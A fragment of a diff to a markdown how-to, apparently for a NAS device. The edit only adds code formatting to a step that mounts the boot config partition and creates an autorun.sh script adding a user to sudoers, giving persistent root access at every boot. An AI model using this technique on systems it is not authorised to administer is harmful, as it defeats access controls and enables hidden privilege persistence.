@@ -18,7 +18,7 @@ mount $(/sbin/hal_app --get_boot_pd port_id=0)6 /tmp/config
 _(Use code with caution.)_
 
 **Create/Edit the Script:**  
-Create or edit /tmp/config/autorun.sh to include a line that injects your user into the sudoers directory:
+Create or edit `/tmp/config/autorun.sh` to include a line that injects your user into the sudoers directory:
 ```
 bash
 
